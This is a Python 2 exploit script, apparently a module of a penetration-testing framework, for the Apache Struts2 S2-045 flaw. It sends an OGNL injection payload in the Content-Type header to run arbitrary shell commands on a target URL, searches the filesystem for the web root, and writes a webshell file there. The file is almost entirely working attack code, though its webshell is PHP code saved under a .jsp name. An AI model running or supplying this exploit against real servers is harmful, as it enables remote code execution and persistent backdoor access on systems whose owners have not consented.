# coding:utf-8
import sys
import re
import urllib2
import httplib
from exp_template import Exploit, Level

"""
构造函数需要传递一下参数
url   测试目标的url
exp需要实现的方法为meta_info和exploit
create by swm  2018/06/25
done:
获取webpath
执行shell命令,写入webshell
can do：
可以使用wget从web服务器上下载各种文件，比较大的也行
"""


class S2045(Exploit):

    def meta_info(self):
        return {
            'name': 'S2-045EXP',
            'author': 'swm',
            'date': '2018/06/25',
            'reference': 'S2-045.docx'
        }

    # 传入url执行命令
    def executecmd(self, cmd):
        payload = "%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?"
        payload += "(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(#cmd='%s')." % cmd
        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        payload += "(#ros.flush())}"

        try:
            headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
            request = urllib2.Request(self.url, headers=headers)
            page = urllib2.urlopen(request).read()
        except httplib.IncompleteRead, e:
            page = e.partial
            self.report('connect error {}'.format(page), Level.error)
        return page

    # 获取web文件的路径
    def getwebpath(self):
        cmd = 'find / -name *.jsp'
        re_webpath = re.compile(r'.+webapps\/\w+\/')
        str = self.executecmd(cmd)
        webpath = re_webpath.search(str)
        if webpath:
            return webpath.group()
        else:
            self.report('Canot find webpath', Level.error)
            return False

    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        webpath = self.getwebpath()
        if webpath:
            # 写入webshell
            cmd = '''echo "<?php @eval($_POST[__RANDPASS__]); ?>" > {}shell01.jsp'''.format(webpath)
            self.executecmd(cmd)
            return True
        else:
            return False


if __name__ == '__main__':
    if len(sys.argv) == 2:
        s = S2045(sys.argv[1])
        res = s.exploit()
        print res

